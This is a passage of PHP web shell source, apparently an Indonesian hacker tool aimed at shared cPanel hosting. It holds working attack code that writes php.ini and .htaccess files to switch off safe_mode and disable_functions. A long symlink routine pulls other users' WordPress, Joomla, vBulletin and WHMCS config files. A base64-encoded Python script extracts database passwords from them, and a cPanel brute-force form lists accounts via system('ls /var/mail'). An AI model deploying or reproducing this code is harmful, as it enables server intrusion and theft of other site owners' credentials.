b25lOiBwcmludCAoc2VjcjMuZ3JvdXAoMikpDQogICAgICAgIHNlY3I0ID0gcmUuc2VhcmNoIChyIihEQlBBU1NXT1JEID0gJykoLitbXj5dKSguOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNSA9IHJlLnNlYXJjaCAociIoREJwYXNzID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNSBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I1Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I2IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjYuZ3JvdXAoMikpDQogICAgICAgIHNlY3I3ID0gcmUuc2VhcmNoIChyIihtb3NDb25maWdfcGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICBmLmNsb3NlKCkNCmV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQpOg0KICBwcmludCAnXG5UaGFua3MgZm9yIHVzaW5nIGl0IC5fXic=';
$file = fopen("cp.py","w+");
$write = fwrite ($file ,base64_decode($cp));
fclose($file);
chmod("cp.py",0755);
$url = $_POST['url'];
echo"<center>
<textarea cols=\"90\" rows=\"20\" name=\"usernames\">";
system("python cp.py $url config");
unlink ('cp.py');
echo"</textarea>
</center>";
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
exit;
}
if($_POST['matikan']=='sekatan'){
@error_reporting(0);
$phpini =
'c2FmZV9tb2RlPU9GRg0KZGlzYWJsZV9mdW5jdGlvbnM9Tk9ORQ==';
$file = fopen("php.ini","w+");
$write = fwrite ($file ,base64_decode($phpini));
fclose($file);
$htaccess =
'T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ==';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
echo "<hr><center><b>DONE!";
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
exit;
}
if($_POST['mendapatkan']=='passwd'){
@set_magic_quotes_runtime(0);
ob_start();
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$fn = $_POST['foldername'];
//all function here

function syml($usern,$pdomain)
	{
		symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home2/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home2/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home2/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home2/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home2/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home2/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home2/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home2/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home2/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home2/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home2/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home2/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home2/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home2/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home2/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home2/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home2/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home2/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home2/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home2/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home2/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home2/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home3/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home3/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home3/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home3/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home3/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home3/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home3/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home3/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home3/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home3/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home3/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home3/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home3/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home3/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home3/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home3/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home3/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home3/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home3/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home3/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home3/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home3/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home3/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home4/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home4/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home4/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home4/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home4/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home4/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home4/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home4/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home4/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home4/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home4/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home4/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home4/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home4/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home4/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home4/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home4/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home4/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home4/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home4/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home4/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home4/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home5/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home5/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home5/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home5/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home5/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home5/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home5/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home5/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home5/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home5/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home5/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home5/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home5/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home5/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home5/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home5/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home5/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home5/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home5/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home5/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home5/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home5/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home6/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home6/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home6/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home6/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home6/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home6/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home6/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home6/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home6/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home6/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home6/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home6/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home6/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home6/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home6/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home6/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home6/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home6/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home6/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home6/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home6/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home6/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home6/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home7/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home7/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home7/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home7/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home7/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home7/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home7/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home7/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home7/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home7/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home7/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home7/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home7/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home7/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home7/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home7/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home7/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home7/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home7/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home7/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home7/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home7/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
	}

				$d0mains = @file("/etc/named.conf");
		
				if($d0mains)
				{
					mkdir($fn);
					chdir($fn);
										
					foreach($d0mains as $d0main)
					{
						if(eregi("zone",$d0main))
						{
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
								
							if(strlen(trim($domains[1][0])) > 2)
							{ 
								$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
								
								syml($user['name'],$domains[1][0]);					
							}
						}
					}
					echo "<center><font color=lime size=3>[ Done ]</font></center>";
					echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
				}
				else
				{
					mkdir($fn);
					chdir($fn);
					$temp = "";
					$val1 = 0;
					$val2 = 1000;
					for(;$val1 <= $val2;$val1++) 
					{
						$uid = @posix_getpwuid($val1);
						if ($uid)
							$temp .= join(':',$uid)."\n";
					 }
					 echo '<br/>';
					 $temp = trim($temp);
					 
					 $file5 = fopen("test.txt","w");
					 fputs($file5,$temp);
					 fclose($file5);

$htaccess =
'T3B0aW9ucyBhbGwgCkRpcmVjdG9yeUluZGV4IHJlYWRtZS5odG1sIApBZGRUeXBlIHRleHQvcGxh
aW4gLnBocCAKQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgCkFkZFR5cGUgdGV4dC9wbGFp
biAuaHRtbCAKQWRkSGFuZGxlciB0eHQgLmh0bWwgClJlcXVpcmUgTm9uZSAKU2F0aXNmeSBBbnk=
';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
					 
					 $file = fopen("test.txt", "r") or exit("Unable to open file!");
					 while(!feof($file))
					 {
						$s = fgets($file);
						$matches = array();
						$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
						$matches = str_replace("home/","",$matches[1]);
						if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
							continue;
						syml($matches,$matches);
					 }
					fclose($file);
					echo "</table>";
					unlink("test.txt");
					echo "<center><font color=lime size=3>[ Done ]</font></center>";
					echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
				}
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
exit;
}
?>
<form method="POST" target="_blank">
	<strong>
<input name="page" type="hidden" value="find"><table>      				
    </strong><br><br><center><font size="5" style="italic" color="#00ff00">=[ Cpanel BruteForce ]=</font></center><br><br>
    <table width="600" border="0" cellpadding="3" cellspacing="1" align="center">
	<tr>
	<td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<center><b><font size="5" style="italic" color="#00ff00">Cpanel BruteForce</font></b></center></td></tr>
    <tr>
    <td>
    <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>User :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="usernames"><?php system('ls /var/mail');?></textarea></strong></td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>Pass :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="passwords"></textarea></strong></td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>Type :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
    <span class="style2"><strong>Simple : </strong> </span>
	<strong>
	<input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
    <font class="style2"><strong>/etc/passwd : </strong> </font>
	<strong>
	<input type="radio" name="type" value="passwd" class="style3"></strong><span class="style3"><strong>
	</strong>
	</span>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515"  colspan="5"><strong><input class ='inputzbut' type="submit" value="start">
    </strong>
    </td>
    <tr>
</form> 
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Get Config :</strong></td>
    				</tr>
<form method="POST" target="_blank">
	<strong>
<input name="mendapatkan" type="hidden" value="passwd">        				
    </strong>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Folder Name :</strong></td>
    <td valign="top" bgcolor="#151515"><strong><input class ='inputz' size="35" name="foldername" type="text"></strong></td>
	</strong>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="GO">
    </strong>
    </td>
    <tr>
</form>   
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Get Wordlist</strong></td>
    				</tr>
<form method="POST" target="_blank">
	<strong>
<input name="pass" type="hidden" value="password">        				
    </strong>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Url Config :</strong></td>
    <td valign="top" bgcolor="#151515"><strong><input class ='inputz' size="35" name="url" type="text"></strong></td>
	</strong>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="GO">
    </strong>
    </td>
    <tr>
</form>
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Info 
	Security</strong></td>
    				</tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Safe Mode</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
	<strong>
<?php
$safe_mode = ini_get('safe_mode');
if($safe_mode=='1')
{
echo 'ON';
}else{
echo 'OFF';
}

?>	
	</strong>	
	</td>
    				</tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Desible Function</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
	<strong>
<form method="POST" target="_blank">
	<strong>
<input name="matikan" type="hidden" value="sekatan">        				
    </strong>

<?php
if(''==($func=@ini_get('disable_functions')))
{
echo "<font color=#00ff00>No Security for Function</font></b>";
}else{
echo '<script>alert("Please see below and press >Please Click Here First!<");</script>';
echo "<font color=red>$func</font></b>";
echo '<tr><td valign="top" bgcolor="#151515" style="width: 139px"></td>';
echo '<td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="Please Click Here First!">
    </strong>
    </td></tr>';
}
?></strong></td></tr></table></table></table>
<?
}
///////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'tutor'))
    {
    ?>
	<form action="?y=<?php echo $pwd; ?>&x=tutor" method="post">
	<center><br><br><b>+--=[ Tutorial & Ebook hacking ]=--+</b><br>
		<form method="post" action="">
<table class="tabnet" border="1" >
<tr>
		<td align="center">English</td><td align="center">Indonesian</td>
	</tr>
	<tr>
		<td><form method="post" action="">&nbsp;
	E-book Hacking &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;
	<select class="inputzbut" name="pilih" id="pilih">
	<option value=""selected>-----------------[ Select ]-----------------</option>
